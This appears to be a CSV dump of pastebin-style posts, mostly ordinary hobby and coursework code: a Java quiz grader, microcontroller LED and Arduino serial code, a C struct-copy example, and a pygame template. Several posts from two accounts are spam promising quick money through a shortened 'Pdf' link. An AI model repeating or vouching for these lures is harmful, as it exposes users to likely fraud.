id,title,username,language,date,content
XyvWFi8b,EARN $900 INSTANTLY 2025⭐ G8,ATrollerLinker,JavaScript,Monday 14th of April 2025 01:01:11 PM CDT," 
Pdf https://tinyurl.com/privguidee


b7uZPn7Zku
"
qngFy0Gu,Make $1000 15-MINUTES  (BEGINNER) HV,ATrollerLinker,JavaScript,Monday 14th of April 2025 12:47:47 PM CDT," 
Pdf https://tinyurl.com/privguidee


bDQyYLqP5y
"
m1ufRYPv,[NP] Quiz,dzocesrce,Java,Monday 14th of April 2025 12:41:25 PM CDT,"import java.io.PrintStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.IntSummaryStatistics;
import java.util.List;
import java.util.stream.IntStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class QuizTest {
    public static void main(String[] args) {

        Scanner sc = new Scanner(System.in);

        Quiz quiz = new Quiz();

        int questions = Integer.parseInt(sc.nextLine());

        for (int i=0;i<questions;i++) {
            try {
                quiz.addQuestion(sc.nextLine());
            } catch (InvalidOperationException e) {
                System.out.println(e.getMessage());
            }
        }

        List<String> answers = new ArrayList<>();

        int answersCount =  Integer.parseInt(sc.nextLine());

        for (int i=0;i<answersCount;i++) {
            answers.add(sc.nextLine());
        }

        int testCase = Integer.parseInt(sc.nextLine());

        if (testCase==1) {
            quiz.printQuiz(System.out);
        } else if (testCase==2) {
            try {
                quiz.answerQuiz(answers, System.out);
            } catch (InvalidOperationException e) {
                System.out.println(e.getMessage());
            }
        } else {
            System.out.println(""Invalid test case"");
        }
    }
}

class InvalidOperationException extends Exception{
    public InvalidOperationException(String message) {
        super(message);
    }
}

abstract class Question implements Comparable<Question> {
    private String name;
    private int points;
    private Type type;

    public Question(String name, int points) {
        this.name = name;
        this.points = points;
    }

    public String getName() {
        return name;
    }

    public int getPoints() {
        return points;
    }

    public abstract String getAnswer();

    public abstract Type getType();

}

class MultipleChoiceQuestion extends Question{
    private char answer;
    public MultipleChoiceQuestion(String name, int points, char answer) {
        super(name, points);
        this.answer=answer;
    }

    public String getAnswer() {
        return String.valueOf(answer);
    }

    @Override
    public Type getType() {
        return Type.MC;
    }

    @Override
    public String toString() {
        return String.format(""Multiple Choice Question: %s Points %d Answer: %c"",super.getName(),super.getPoints(),answer);
    }

    @Override
    public int compareTo(Question o) {
        return Integer.compare(super.getPoints(),o.getPoints());
    }
}

class TrueFalseQuestion extends Question{
    private boolean answer;

    public TrueFalseQuestion(String name, int points,boolean answer) {
        super(name, points);
        this.answer=answer;
    }

    public String getAnswer() {
        return String.valueOf(answer);
    }

    @Override
    public Type getType() {
        return Type.TF;
    }

    @Override
    public String toString() {
        return String.format(""True/False Question: %s Points: %d Answer: %s"",super.getName(),super.getPoints(),answer);
    }

    @Override
    public int compareTo(Question o) {
        return Integer.compare(super.getPoints(),o.getPoints());
    }
}

enum Type {
    MC,
    TF
}


class Quiz {
    List<Question> questions;

    public Quiz() {
        this.questions = new ArrayList<>();
    }

    public int checkAnswer(char c){
        return ""ABCDE"".indexOf(c);
    }

    public void addQuestion(String s) throws InvalidOperationException {
        String[] parts= s.split("";"");
        String name= parts[1];
        int points= Integer.parseInt(parts[2]);
        String answer= parts[3];
        if(parts[0].equals(""MC"")){
            if(checkAnswer(answer.charAt(0))==-1)
                throw new InvalidOperationException(answer.charAt(0)+"" is not allowed option for this question"");
            questions.add(new MultipleChoiceQuestion(name,points,answer.charAt(0)));
        }
        else{
            questions.add(new TrueFalseQuestion(name,points,Boolean.parseBoolean(parts[3])));
        }
    }

    public void printQuiz(PrintStream out) {
        PrintWriter printWriter = new PrintWriter(out);

        questions.stream().sorted(Comparator.reverseOrder()).forEach(i->printWriter.println(i));
        printWriter.flush();
    }



    public void answerQuiz(List<String> answers, PrintStream out) throws InvalidOperationException {
        PrintWriter printWriter = new PrintWriter(out);
        if(answers.size()!= questions.size())
            throw new InvalidOperationException(""Answers and questions must be of same length!"");
        double totalPoints=0;
        for(int i=0; i<answers.size();i++){
            if(questions.get(i).getAnswer().equals(answers.get(i))) {
                printWriter.println(String.format(""%d. %.2f"", i+1,(double) questions.get(i).getPoints()));
                totalPoints += questions.get(i).getPoints();
            }
            else{
                if(questions.get(i).getType().equals(Type.MC)){
                    printWriter.println(String.format(""%d. %.2f"",i+1,(double) questions.get(i).getPoints()*0.2*(-1)));
                    totalPoints-=questions.get(i).getPoints()*0.2;
                }
                else{
                    printWriter.println(String.format(""%d. 0.00"",i+1));
                }

            }
        }
        printWriter.println(String.format(""Total points: %.2f"",totalPoints));
        printWriter.flush();
    }
}"
0LfN8AK7,Make $1000 15-MINUTES  (BEGINNER) HV,nihjae45,JavaScript,Monday 14th of April 2025 12:34:15 PM CDT," 
Pdf https://tinyurl.com/privguidee


vnfJvAvVGZ
"
gfRZqiCT,CortexM0 GPO LED,Dani_info,C,Monday 14th of April 2025 12:33:44 PM CDT,"#include <MKL25Z4.h>

//red -> PTB18

#define MASK(x) (1UL << (x))

int main(){
	SIM->SCGC5|=SIM_SCGC5_PORTB_MASK; //enable clock 
	PORTB->PCR[18]&=~PORT_PCR_MUX_MASK; // clear PCR
	PORTB->PCR[18]|=PORT_PCR_MUX(1); //set PB19 as GPIO (MUX1)
	PTB->PDDR|=MASK(18); // set PDDR[18]=1 -> output
	PTB->PSOR=~MASK(18); // set PSOR[18]=0 -> set GPO PB19 LOW to turn on the active LOW LED 
	while (1)
		;
	return 0;
}"
zS46rh3A,EARN $900 INSTANTLY 2025 2U,nihjae45,JavaScript,Monday 14th of April 2025 12:20:50 PM CDT," 
Pdf https://tinyurl.com/privguidee


Va8ZGZLtsN
"
5JDm9ra7,Make $1000 15-MINUTES (BEGINNER) FM,nihjae45,JavaScript,Monday 14th of April 2025 12:07:25 PM CDT," 
Pdf https://tinyurl.com/privguidee


tNzUEbxc3O
"
zrDFg95p,clone deep copy,STANAANDREY,C,Monday 14th of April 2025 11:45:39 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NMAX 100
typedef struct {
  int id;
  char name[NMAX];
} Entity;

Entity cloneEntity(const Entity *const ep) {
  Entity aux;
  aux.id = ep->id;
  strncpy(aux.name, ep->name, NMAX);
  return aux;
}

void printEntity(const Entity *const ep) {
  printf(""{ id: %d, name: %s }\n"", ep->id, ep->name);
}

int main(void) {
  Entity e1 = {.id = 1, .name = ""asd""}, e2;
  e2 = cloneEntity(&e1);
  strcat(e2.name, ""123"");
  printEntity(&e1);
  printEntity(&e2);
  return 0;
}"
MiUiLeEv,Lesson 1 - Base,MCreeper12731,Python,Monday 14th of April 2025 11:40:27 AM CDT,"import pygame
pygame.init()
pygame.font.init()

width = 1200
height = 600
window = pygame.display.set_mode((width, height))
pygame.display.set_caption(""Game Title"")

# Class definitions and variables


# Main game loop
clock = pygame.time.Clock()
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    window.fill((255, 255, 255))

    # Moving and drawing
    
    pygame.display.update()
    clock.tick(60)

pygame.quit()"
qGkLifpK,Untitled,dllbridge,C,Monday 14th of April 2025 11:25:56 AM CDT,"void setup() 
{
  Serial.begin(9600);                               // Открываем порт на 9600 бод
  pinMode(LED_BUILTIN, OUTPUT);
}

void loop() 
{
  if (Serial.available() > 0)                       // Если пришли данные
  {
    String command = Serial.readStringUntil('\n');  // Читаем до символа новой строки
    command.trim();                                 // Удаляем лишние пробелы и символы

    if (command == ""Are_you_Arduino?"")              // Обработка команд
    {
      digitalWrite(LED_BUILTIN, HIGH);
      Serial.println(""S_ _Y. Yes, it's Arduino !"");
      delay(50);
      digitalWrite(LED_BUILTIN, LOW);
      return;
    } 

    if (command == ""LED_ON"") 
    {
      digitalWrite(LED_BUILTIN, HIGH);
      Serial.println(""LED is ON"");
    } 
    else if (command == ""LED_OFF"") 
    {
      digitalWrite(LED_BUILTIN, LOW);
      Serial.println(""LED is OFF"");
    } 
    else if (command == ""GET_TEMP"") 
    { 
      float temp = 25.5 + (rand() % 10) / 10.0;       // Пример: возвращаем ""фейковую"" температуру
      Serial.print(""TEMP:"");
      Serial.println(temp, 1);                        // Одна цифра после запятой
    } 
    else {
      Serial.print(""UNKNOWN: "");
      Serial.println(command);
    }
  }
}"
